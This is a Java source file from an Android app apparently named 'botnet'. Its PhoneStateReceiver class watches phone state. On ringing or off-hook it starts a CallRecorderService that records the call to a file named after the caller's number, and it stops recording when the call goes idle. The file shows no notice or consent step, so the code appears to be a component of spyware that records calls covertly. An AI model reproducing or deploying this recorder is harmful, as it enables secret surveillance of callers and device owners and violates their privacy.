package com.example.kico.botnet;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.telephony.TelephonyManager;
//import android.util.Log;
import com.example.kico.botnet.utils.CommonMethods;
import com.example.kico.botnet.utils.Constants;

import java.util.Objects;

import khangtran.preferenceshelper.PrefHelper;

public class PhoneStateReceiver extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent) {
        //Log.i("tntkhang", "PhoneStateReceiver - onReceive");
        try {
            PrefHelper.initHelper(context);
            Bundle extras = intent.getExtras();
            String state = extras != null ? extras.getString(TelephonyManager.EXTRA_STATE) : null;

            if (Objects.requireNonNull(state).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                String recPath = startRecording(context, phoneNumber);
//                Log.i("tntkhang", "recPath : " + recPath);
                PrefHelper.setVal(Constants.Prefs.CALL_RECORD_STARTED, !recPath.isEmpty());
            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                String recPath = startRecording(context, phoneNumber);
//                Log.i("tntkhang", "recPath : " + recPath);
                PrefHelper.setVal(Constants.Prefs.CALL_RECORD_STARTED, !recPath.isEmpty());
            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                if (PrefHelper.getBooleanVal(Constants.Prefs.CALL_RECORD_STARTED, false)) {
                    String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    stopRecording(context, phoneNumber);
                }
            }
            //Log.i("tntkhang", "PhoneStateReceiver - onReceive: " + state);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String startRecording(Context context, String number) {
        String trimNumber = CommonMethods.removeSpaceInPhoneNo(number);
        //Log.i("tntkhang", "startRecording - trimNumber: " + trimNumber);

        String time = CommonMethods.getTime();
        String date = CommonMethods.getDate();
        String path = CommonMethods.getPath();
//        String outputPath = path + "/" + trimNumber + "_" + time + ".mp3";
        String outputPath = path + "/" + trimNumber + "_" + time + ".mp4";
        //Log.i("tntkhang", "outputPath: " + outputPath);

        Intent recordService = new Intent(context, CallRecorderService.class);
        recordService.putExtra(Constants.Prefs.PHONE_CALL_NUMBER, trimNumber);
        recordService.putExtra(Constants.Prefs.CALL_RECORD_PATH, outputPath);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(recordService);
        } else {
            context.startService(recordService);
        }

        String name = "";
        return outputPath;
    }

    private void stopRecording(Context context, String phoneNo) {
        //Log.i("tntkhang", "stopRecording: " + phoneNo);
        context.stopService(new Intent(context, CallRecorderService.class));
    }
}
